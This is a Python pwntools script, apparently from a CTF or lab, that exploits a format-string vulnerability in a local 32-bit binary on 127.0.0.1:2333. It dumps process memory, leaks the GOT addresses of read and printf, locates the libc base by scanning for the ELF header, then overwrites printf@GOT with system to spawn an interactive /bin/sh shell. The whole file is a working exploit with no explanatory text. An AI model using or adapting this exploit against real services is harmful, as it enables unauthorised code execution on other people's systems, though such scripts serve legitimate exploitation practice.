from pwn import *
import sys

#context.log_level = 'debug'
#context.arch = 'amd64'
elf = ELF('./vuln32_fmt')

#io = process('./vuln32_fmt')

def exec_fmt(payload):
    io = remote('127.0.0.1', 2333)
    io.send(payload);
    data = io.recv()
    return data

def leak_fmt_off():
    auto_fmt = FmtStr(exec_fmt)
    print auto_fmt.offset
    #payload = fmtstr_payload(auto_fmt.offset, 

def vdump_proc():
    vuln_start_addr = 0x8048000
    fp_dump = open('proc.dump', 'ab+')
    leakfunc_offset = 0

    while True:
        io = remote('127.0.0.1', 2333)
        padd_str = '%' + str(13) + '$s'
        padd_str = padd_str.ljust(8, 'a') + p32(vuln_start_addr+leakfunc_offset)
        io.send(padd_str)
        try:
            data = io.recvuntil('aaa')[:-3]
        except EOFError:
            print hex(leakfunc_offset)
            sys.exit(0)
        data += '\x00'
        leakfunc_offset += len(data)
        fp_dump.write(data)
        fp_dump.flush()
        io.close()

    fp_dump.close()

io = remote('127.0.0.1', '2333')
main_func_addr = 0x80484CB
printf_got = 0x804A010
read_got = 0x804A00C

def mleak_ping(lk_address):
    padd_str = '%13$saaa' + p32(lk_address)
    io.send(padd_str)
    leaked_data = io.recvuntil('aaa')[:-3]
    io.clean()
    return leaked_data

def vexp(system_addr):
    raw_input('continue?')
    payload = fmtstr_payload(11, {printf_got : system_addr})
    io.send(payload)
    io.sendline('/bin/sh')
    io.interactive()

read_addr = u32(mleak_ping(read_got)[:4])
print 'read address:', hex(read_addr)
printf_addr = u32(mleak_ping(printf_got)[:4])
print 'printf address:', hex(printf_addr)
raw_input('leak 2 functions??')

base_addr_m = printf_addr & 0xFFFFF000
libc_base_addr = 0
while True:
    leaked_data = mleak_ping(base_addr_m)
    if len(leaked_data) >= 4:
        if '\x7fELF' in leaked_data:
            print 'libc_base:', hex(base_addr_m)
            break
    base_addr_m -= 0x1000

raw_input('real start?')
system_addr = base_addr_m + 0x3ada0
vexp(system_addr)

io.close()

